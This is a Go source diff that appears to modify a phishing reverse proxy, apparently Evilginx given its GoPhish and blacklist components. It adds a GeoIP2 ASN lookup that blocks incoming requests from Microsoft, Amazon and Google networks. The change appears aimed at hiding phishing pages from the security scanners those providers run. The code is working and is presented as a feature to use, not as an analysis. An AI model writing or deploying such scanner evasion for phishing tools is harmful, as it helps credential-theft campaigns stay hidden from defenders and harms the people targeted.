@@ -32,6 +32,7 @@ import (
 	"sync"
 	"time"
 	utls "github.com/refraction-networking/utls"
+	"github.com/oschwald/geoip2-golang"
 
 	"golang.org/x/net/proxy"
 
@@ -70,6 +71,7 @@ type HttpProxy struct {
 	cfg               *Config
 	db                *database.Database
 	bl                *Blacklist
+	asn_db            *geoip2.Reader // <reads the asn database--.mmdb file
 	gophish           *GoPhish
 	sniListener       net.Listener
 	isRunning         bool
@@ -116,6 +118,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		db:                db,
 		bl:                bl,
 		gophish:           NewGoPhish(),
+		asn_db:            asnDB, // <--- ASN db ASSIGNMENT
 		isRunning:         false,
 		last_sid:          0,
 		developer:         developer,
@@ -230,6 +233,26 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					break
 				}
 			}
+			// --- START ASN BLOCKING ---
+            if p.asn_db != nil {
+                clientIP := net.ParseIP(from_ip)
+                if clientIP != nil {
+                    record, err := p.asn_db.ASN(clientIP)
+                    if err == nil {
+                        // List of ASNs to block (Integers)
+                        // 8075 = Microsoft, 16509 = Amazon, 15169 = Google
+                        blockedASNs := []uint{8075, 16509, 15169}
+                        
+                        for _, blockedASN := range blockedASNs {
+                            if record.AutonomousSystemNumber == blockedASN {
+                                log.Warning("blocked ASN: %d (%s) from IP %s", record.AutonomousSystemNumber, record.AutonomousSystemOrganization, from_ip)
+                                return p.blockRequest(req)
+                            }
+                        }
+                    }
+                }
+            }
+            // --- END ASN BLOCKING ---
 
 			if p.cfg.GetBlacklistMode() != "off" {
 				if p.bl.IsBlacklisted(from_ip) {
